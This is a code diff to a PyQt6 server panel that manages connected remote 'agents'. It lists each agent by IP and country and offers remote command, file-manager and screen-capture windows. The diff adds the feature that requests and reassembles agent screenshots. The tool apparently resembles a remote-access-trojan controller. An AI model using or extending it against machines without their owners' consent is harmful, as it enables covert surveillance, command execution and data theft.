@@ -13,7 +13,7 @@ from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QH
                              QMenu, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
                              QInputDialog, QFileDialog, QProgressBar, QColorDialog)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
-from PyQt6.QtGui import QColor
+from PyQt6.QtGui import QColor, QPixmap
 
 WS_OP_CONTINUE = 0x00
 WS_OP_TEXT = 0x01
@@ -171,6 +171,7 @@ class ClientSignals(QObject):
     on_outp = pyqtSignal(object, str)
     on_disconnect = pyqtSignal(object)
     on_fs = pyqtSignal(object, bytes)
+    on_screen = pyqtSignal(object, bytes)
 
 
 class ClientSession:
@@ -295,12 +296,10 @@ class RemoteCmdDialog(QDialog):
         log_console(f"CMD会话关闭: {self.client.display_name}")
         if self.client.connected:
             self.client.send_packet(b"KILL")
-        # 断开信号（虽然 MainWindow 不再直接连 on_outp，保险起见）
         try:
             self.client.signals.on_outp.disconnect(self.append_text)
         except Exception:
             pass
-        # 从主窗口字典删除自己
         if self.main_window and self.client in self.main_window.open_cmd_dialogs:
             if self.main_window.open_cmd_dialogs[self.client] is self:
                 del self.main_window.open_cmd_dialogs[self.client]
@@ -363,8 +362,6 @@ class FileManagerDialog(QDialog):
         self.log_box.setReadOnly(True)
         self.log_box.setMaximumHeight(100)
         lay.addWidget(self.log_box)
-
-        # 注意：不在这里连接 on_fs 信号，由 MainWindow 分发
 
         self.timer = QTimer(self)
         self.timer.setInterval(50)
@@ -434,7 +431,6 @@ class FileManagerDialog(QDialog):
         log_console(f"[文件管理 {self.client.display_name}] {msg}")
 
     def on_fs_data(self, sess, body: bytes):
-        """由 MainWindow 调用，分发 Agent 的文件系统响应"""
         if self._closing:
             return
         self.fs_events.append(bytes(body))
@@ -767,11 +763,182 @@ class FileManagerDialog(QDialog):
         else:
             log_console("[FABT] 连接已断开，未发送")
         self.reset_transfer_state()
-        # 从主窗口字典删除自己
         if self.main_window and self.client in self.main_window.open_file_dialogs:
             if self.main_window.open_file_dialogs[self.client] is self:
                 del self.main_window.open_file_dialogs[self.client]
         log_console(f"文件管理关闭: {self.client.display_name}")
+        super().closeEvent(event)
+
+
+class ScreenPreviewDialog(QDialog):
+    """接收 agent 的 SCRM/SCRD，重组 JPEG 并显示"""
+    def __init__(self, client_session: ClientSession, parent=None):
+        super().__init__(parent)
+        self.main_window = parent
+        self.client = client_session
+        self.setWindowTitle(f"屏幕截图 - {client_session.display_name}")
+        self.resize(960, 680)
+
+        self._closing = False
+        self._buf = bytearray()
+        self._total = 0
+        self._chunks_received = 0
+        self._chunks_total = 0
+        self._last_pixmap = None
+
+        lay = QVBoxLayout(self)
+
+        info_bar = QHBoxLayout()
+        info_bar.addWidget(QLabel(f"🌍 {client_session.country}  📡 {client_session.ip}"))
+        info_bar.addStretch()
+        self.btn_refresh = QPushButton("刷新截屏")
+        self.btn_refresh.clicked.connect(self.request_screenshot)
+        info_bar.addWidget(self.btn_refresh)
+        self.btn_save = QPushButton("保存为...")
+        self.btn_save.clicked.connect(self.save_screenshot)
+        self.btn_save.setEnabled(False)
+        info_bar.addWidget(self.btn_save)
+        lay.addLayout(info_bar)
+
+        self.status = QLabel("等待截图...")
+        lay.addWidget(self.status)
+
+        self.image_label = QLabel()
+        self.image_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        self.image_label.setMinimumSize(640, 480)
+        self.image_label.setStyleSheet("border: 1px solid #00aa00;")
+        lay.addWidget(self.image_label, 1)
+
+        self.log_box = QTextEdit()
+        self.log_box.setReadOnly(True)
+        self.log_box.setMaximumHeight(80)
+        lay.addWidget(self.log_box)
+
+        if parent and hasattr(parent, 'is_dark_mode'):
+            self.apply_theme(parent.is_dark_mode, parent.fg_color)
+
+        log_console(f"截屏窗口打开: {client_session.display_name}")
+        self.request_screenshot()
+
+    def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
+        if dark:
+            self.setStyleSheet(f"""
+                QDialog {{ background-color: {DARK_BG}; }}
+                QLabel {{ color: {fg_color}; }}
+                QTextEdit {{
+                    background-color: {DARK_BG};
+                    color: {fg_color};
+                    border: 1px solid {DARK_BORDER};
+                    font-family: Consolas, "Courier New", monospace;
+                }}
+                QPushButton {{
+                    background-color: {DARK_BTN_BG};
+                    color: {fg_color};
+                    border: 1px solid {DARK_BORDER};
+                    padding: 4px 10px;
+                    font-family: Consolas, "Courier New", monospace;
+                }}
+                QPushButton:hover {{ background-color: {DARK_BTN_HOVER}; }}
+                QPushButton:disabled {{ color: {DARK_DISABLED}; }}
+            """)
+        else:
+            self.setStyleSheet("")
+
+    def request_screenshot(self):
+        if self._closing or not self.client.connected:
+            return
+        self._buf = bytearray()
+        self._total = 0
+        self._chunks_received = 0
+        self._chunks_total = 0
+        self.status.setText("已发送 SCRN，等待数据...")
+        self.log("已发送 SCRN")
+        self.client.send_packet(b"SCRN")
+
+    def on_scr_data(self, sess, body: bytes):
+        """由 MainWindow 调用，处理 SCRM / SCRD"""
+        if self._closing:
+            return
+        if len(body) < 4:
+            return
+        cmd = body[0:4]
+        payload = body[4:]
+
+        if cmd == b"SCRM":
+            if len(payload) >= 4:
+                self._total = struct.unpack("<I", payload[0:4])[0]
+                self._buf = bytearray()
+                self._chunks_received = 0
+                self._chunks_total = 0
+                self.status.setText(f"开始接收，总大小 {self._total} 字节")
+                self.log(f"SCRM: total={self._total}")
+
+        elif cmd == b"SCRD":
+            if len(payload) >= 8:
+                idx = struct.unpack("<I", payload[0:4])[0]
+                total_chunks = struct.unpack("<I", payload[4:8])[0]
+                data = payload[8:]
+                if self._chunks_total == 0:
+                    self._chunks_total = total_chunks
+                self._buf.extend(data)
+                self._chunks_received += 1
+                self.status.setText(
+                    f"接收中 {self._chunks_received}/{self._chunks_total} 块，"
+                    f"累计 {len(self._buf)}/{self._total} 字节")
+                if self._total > 0 and len(self._buf) >= self._total:
+                    self._finalize()
+
+    def _finalize(self):
+        pix = QPixmap()
+        if not pix.loadFromData(bytes(self._buf), "JPEG"):
+            self.log("JPEG 解码失败")
+            self.status.setText("解码失败")
+            return
+        self._last_pixmap = pix
+        self._display_pixmap()
+        self.status.setText(f"完成 {pix.width()}x{pix.height()}，{len(self._buf)} 字节")
+        self.log(f"完成，尺寸={pix.width()}x{pix.height()}，{len(self._buf)} 字节")
+        self.btn_save.setEnabled(True)
+
+    def _display_pixmap(self):
+        if self._last_pixmap is None:
+            return
+        w = max(self.image_label.width(), 640)
+        h = max(self.image_label.height(), 480)
+        scaled = self._last_pixmap.scaled(
+            w, h,
+            Qt.AspectRatioMode.KeepAspectRatio,
+            Qt.TransformationMode.SmoothTransformation)
+        self.image_label.setPixmap(scaled)
+
+    def resizeEvent(self, event):
+        super().resizeEvent(event)
+        self._display_pixmap()
+
+    def save_screenshot(self):
+        if not self._buf:
+            return
+        save_path, _ = QFileDialog.getSaveFileName(self, "保存截图", "screenshot.jpg",
+                                                   "JPEG (*.jpg *.jpeg)")
+        if not save_path:
+            return
+        try:
+            with open(save_path, "wb") as f:
+                f.write(self._buf)
+            self.log(f"已保存到 {save_path}")
+        except OSError as e:
+            self.log(f"保存失败: {e}")
+
+    def log(self, msg):
+        self.log_box.append(msg)
+        log_console(f"[截屏 {self.client.display_name}] {msg}")
+
+    def closeEvent(self, event):
+        self._closing = True
+        if self.main_window and self.client in self.main_window.open_screen_dialogs:
+            if self.main_window.open_screen_dialogs[self.client] is self:
+                del self.main_window.open_screen_dialogs[self.client]
+        log_console(f"截屏窗口关闭: {self.client.display_name}")
         super().closeEvent(event)
 
 
@@ -815,6 +982,7 @@ class MainWindow(QMainWindow):
         self.client_model = ClientListModel()
         self.open_cmd_dialogs = {}
         self.open_file_dialogs = {}
+        self.open_screen_dialogs = {}
 
         w = QWidget()
         self.setCentralWidget(w)
@@ -974,6 +1142,8 @@ class MainWindow(QMainWindow):
             dlg.apply_theme(dark, fg)
         for dlg in self.open_file_dialogs.values():
             dlg.apply_theme(dark, fg)
+        for dlg in self.open_screen_dialogs.values():
+            dlg.apply_theme(dark, fg)
 
     def toggle_theme(self):
         self.apply_theme(not self.is_dark_mode)
@@ -1009,8 +1179,8 @@ class MainWindow(QMainWindow):
                 sess = ClientSession(raw_conn, ip, country, display_name)
                 sess.signals.on_outp.connect(self.handle_session_outp)
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
-                # 关键：on_fs 由 MainWindow 连接并分发，不由对话框直接连接
                 sess.signals.on_fs.connect(self.handle_session_fs)
+                sess.signals.on_screen.connect(self.handle_session_screen)
                 self.client_model.add(sess)
                 self.log(f"[新接入] {display_name}")
                 threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True).start()
@@ -1027,10 +1197,15 @@ class MainWindow(QMainWindow):
 
     @pyqtSlot(object, bytes)
     def handle_session_fs(self, sess, body):
-        """把文件系统响应分发给当前活跃的 FileManagerDialog"""
         dlg = self.open_file_dialogs.get(sess)
         if dlg is not None and not dlg._closing:
             dlg.on_fs_data(sess, body)
+
+    @pyqtSlot(object, bytes)
+    def handle_session_screen(self, sess, body):
+        dlg = self.open_screen_dialogs.get(sess)
+        if dlg is not None and not dlg._closing:
+            dlg.on_scr_data(sess, body)
 
     @pyqtSlot(object)
     def handle_session_disconnect(self, sess):
@@ -1042,6 +1217,10 @@ class MainWindow(QMainWindow):
             dlg = self.open_file_dialogs.pop(sess)
             dlg._closing = True
             dlg.reset_transfer_state()
+            dlg.close()
+        if sess in self.open_screen_dialogs:
+            dlg = self.open_screen_dialogs.pop(sess)
+            dlg._closing = True
             dlg.close()
         try:
             self.client_model.remove_by_obj(sess)
@@ -1099,6 +1278,8 @@ class MainWindow(QMainWindow):
                                         elif cmd_code in (b"FDRV", b"FDIR", b"FMET", b"FDAT",
                                                           b"FPRO", b"FDON", b"FACK", b"FOK0", b"FERR"):
                                             sess.signals.on_fs.emit(sess, body)
+                                        elif cmd_code in (b"SCRM", b"SCRD"):
+                                            sess.signals.on_screen.emit(sess, body)
                                         else:
                                             log_console(f"收到未知命令: {cmd_code!r}, len={len(body)}")
             except (OSError, ConnectionResetError) as e:
@@ -1141,6 +1322,7 @@ class MainWindow(QMainWindow):
             s.close()
         self.open_cmd_dialogs.clear()
         self.open_file_dialogs.clear()
+        self.open_screen_dialogs.clear()
         self.btn_start.setEnabled(True)
         self.btn_stop.setEnabled(False)
         self.log("服务器已停止")
@@ -1152,6 +1334,7 @@ class MainWindow(QMainWindow):
         menu = QMenu()
         act_cmd = menu.addAction("打开远程CMD会话")
         act_file = menu.addAction("打开文件管理")
+        act_screen = menu.addAction("屏幕截图")
         ret = menu.exec(self.view.viewport().mapToGlobal(pos))
         if ret == act_cmd:
             if sess in self.open_cmd_dialogs:
@@ -1170,11 +1353,23 @@ class MainWindow(QMainWindow):
                 if dlg.isVisible():
                     dlg.raise_(); dlg.activateWindow(); return
                 else:
-                    dlg._closing = True   # 标记旧对话框失效
+                    dlg._closing = True
                     del self.open_file_dialogs[sess]
             dlg = FileManagerDialog(sess, parent=self)
             dlg.apply_theme(self.is_dark_mode, self.fg_color)
             self.open_file_dialogs[sess] = dlg
+            dlg.show()
+        elif ret == act_screen:
+            if sess in self.open_screen_dialogs:
+                dlg = self.open_screen_dialogs[sess]
+                if dlg.isVisible():
+                    dlg.raise_(); dlg.activateWindow(); return
+                else:
+                    dlg._closing = True
+                    del self.open_screen_dialogs[sess]
+            dlg = ScreenPreviewDialog(sess, parent=self)
+            dlg.apply_theme(self.is_dark_mode, self.fg_color)
+            self.open_screen_dialogs[sess] = dlg
             dlg.show()
 
     def closeEvent(self, event):
